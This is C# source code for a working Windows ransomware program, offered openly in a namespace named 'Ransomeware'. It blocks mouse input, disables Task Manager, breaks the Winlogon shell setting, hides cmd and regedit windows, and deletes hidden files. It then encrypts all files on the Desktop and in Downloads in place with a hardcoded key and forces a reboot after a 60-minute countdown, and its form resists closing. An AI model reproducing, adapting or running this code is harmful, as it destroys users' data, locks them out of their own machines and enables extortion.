using Microsoft.Win32;
using System;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using AES;
namespace Ransomeware
{
    public partial class Form1 : Form
    {
        //For hide window
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        [DllImport("User32")]
        private static extern int ShowWindow(int hwnd, int nCmdShow);

        //for BlockMouse
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);
        public Form1()
        {
            InitializeComponent();
            //set countdowntimer to 60 minutes
            label1.Text = TimeSpan.FromMinutes(60).ToString();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            loader();
        }


        private void button1_Click(object sender, EventArgs e)
        {
            //If you dont write
            if (codeBox.Text == "") 
            {
                MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            //If you write correct key
            else if (codeBox.Text == "password123") 
            {

                MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
                //Enable taskmanager
                RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
                //Repair shell
                RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);

                OFF_Encrypt(); //decrypt all encrypt files

                //kill ransomware
                Process[] _process = null;
                _process = Process.GetProcessesByName("Rasomware2.0");
                foreach (Process proces in _process)
                {
                    proces.Kill();
                }
            }

            else //If you write something
            {
                MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void loader()
        {

            this.Opacity = 0.0;

            //Invisible
            this.Size = new Size(50, 50);      
            Location = new Point(-100, -100);

            //Freeze mouse
            FreezeMouse(); 


            //Disable taskmanager
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);

            //Remove wallpaper
            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            reg2.SetValue("Wallpaper", "", RegistryValueKind.String);

            //If you shutdown your computer, you can't run winodws well
            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg3.SetValue("Shell", "empty", RegistryValueKind.String);

            //define for desktop path
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); 
            //Delete all hidden files on desktop because we cant encrypt hidden files :-(
            string[] filesPaths = Directory.EnumerateFiles(path + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            foreach (string file2 in filesPaths)
                File.Delete(file2);

            //Make countdowntimer
            var startTime = DateTime.Now;

            var timer = new Timer() { Interval = 1000 };

            //Todo timer tick
            timer.Tick += (obj, args) =>
            label1.Text =
            (TimeSpan.FromMinutes(60) - (DateTime.Now - startTime))
            .ToString("hh\\:mm\\:ss");


            timer.Enabled = true;
            //show window again
            tmr_hide.Start();

            //delete desktop.ini because we cant encrypt desktop.ini files
            tmr_show.Start();

            //Block cmd, register...
            tmr_if.Start();

            //Start locking files
            tmr_encrypt.Start();

            //If you see on window 00:00:00, system will kill
            tmr_clock.Start(); 

        }
        private void tmr_hide_Tick(object sender, EventArgs e)
        {
            tmr_hide.Stop();
            this.Opacity = 100.0;
            this.Size = new Size(701, 584);
            Location = new Point(500, 500);
            //Anti freeze
            Thawouse(); 
        }

        private void tmr_show_Tick(object sender, EventArgs e)
        {
            tmr_show.Stop();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string filepath = (path + @"\desktop.ini");
            File.Delete(filepath);

            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string filedl = (downloadFolder + @"\desktop.ini");
            File.Delete(filedl);
        }

        private void tmr_if_Tick(object sender, EventArgs e)
        {
            tmr_if.Stop();
            int hWnd;
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName == "cmd")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "regedit")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "Processhacker")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "sdclt")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }
            }
            tmr_if.Start();

        }

        private void tmr_encrypt_Tick(object sender, EventArgs e)
        {
            tmr_encrypt.Stop();
            Start_Encrypt();
        }

        private void tmr_clock_Tick(object sender, EventArgs e)
        {
            tmr_clock.Stop();
            Process[] _process = null;
            _process = Process.GetProcessesByName("Ransomware");
            foreach (Process proces in _process)
            {
                Process.Start("shutdown", "/r /t 0");
                proces.Kill();
            }
            this.Close();

        }
        public static void FreezeMouse() //Freeze mouse
        {
            BlockInput(true);
        }

        public static void Thawouse() //unfreeze
        {
            BlockInput(false);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; //for antikill
        }

        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {

                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                // Hash the password with SHA256
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
                byte[] bytesEncrypted = Cipher.Encrypt(bytesToBeEncrypted,passwordBytes,128) ;

                string fileEncrypted = file;

                File.WriteAllBytes(fileEncrypted, bytesEncrypted);
            }
        }
        //start encrypt files on desktop and download folder
        static void Start_Encrypt() 
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);



            EncryptionFile enc = new EncryptionFile();

            //your password
            string password = "password123"; 

            for (int i = 0; i < files.Length; i++)
            {
                enc.EncryptFile(files[i], password);

            }

            for (int i = 0; i < files2.Length; i++)
            {
                enc.EncryptFile(files2[i], password);

            }
        }

        //descrypt
        static void OFF_Encrypt() 
        {

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);


            DecryptionFile dec = new DecryptionFile();

            string password = "password123";

            for (int i = 0; i < files.Length; i++)
            {
                dec.DecryptFile(files[i], password);
            }

            for (int i = 0; i < files2.Length; i++)
            {
                dec.DecryptFile(files2[i], password);

            }
        }

        public class DecryptionFile
        {
            public void DecryptFile(string fileEncrypted, string password)
            {

                byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesDecrypted = Cipher.Decrypt(bytesToBeDecrypted, passwordBytes, 128);

                string file = fileEncrypted;
                File.WriteAllBytes(file, bytesDecrypted);
            }
        }
    }
}